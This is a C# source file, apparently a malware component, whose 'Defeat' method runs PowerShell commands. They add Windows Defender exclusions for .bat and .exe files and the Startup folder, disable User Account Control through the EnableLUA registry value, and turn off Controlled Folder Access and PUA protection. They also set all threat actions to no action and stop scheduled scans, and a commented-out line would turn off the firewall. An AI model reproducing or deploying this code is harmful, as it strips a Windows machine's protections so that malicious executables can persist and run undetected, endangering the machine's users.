using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Text;
using System.Threading.Tasks;

namespace Defeat
{
    public static class Defender
    {
        private static readonly PowerShell[] _commands = new[]
        {
            PowerShell.Create().AddCommand("Add-MpPreference").AddParameter("ExclusionExtension", ".bat"),
            PowerShell.Create().AddCommand("Add-MpPreference").AddParameter("ExclusionExtension", ".exe"),
            PowerShell.Create().AddCommand("Add-MpPreference").AddParameter("ExclusionPath", $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
            PowerShell.Create().AddCommand("New-ItemProperty").AddParameter("Path", "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system").AddParameter("Name", "EnableLUA").AddParameter("PropertyType", "DWord").AddParameter("Value", "0").AddParameter("Force"),
            PowerShell.Create().AddCommand("Set-MpPreference").AddParameter("EnableControlledFolderAccess", "Disabled"),
            PowerShell.Create().AddCommand("Set-MpPreference").AddParameter("PUAProtection", "disable"),
            PowerShell.Create().AddCommand("Set-MpPreference").AddParameter("HighThreatDefaultAction", "6").AddParameter("Force"),
            PowerShell.Create().AddCommand("Set-MpPreference").AddParameter("ModerateThreatDefaultAction", "6"),
            PowerShell.Create().AddCommand("Set-MpPreference").AddParameter("LowThreatDefaultAction", "6"),
            PowerShell.Create().AddCommand("Set-MpPreference").AddParameter("SevereThreatDefaultAction", "6"),
            PowerShell.Create().AddCommand("Set-MpPreference").AddParameter("ScanScheduleDay", "8"),
            // netsh advfirewall set allprofiles state off // Firewall
        };

        public static void Defeat()
        {
            foreach (var command in _commands) command.Invoke();
        }
    }
}
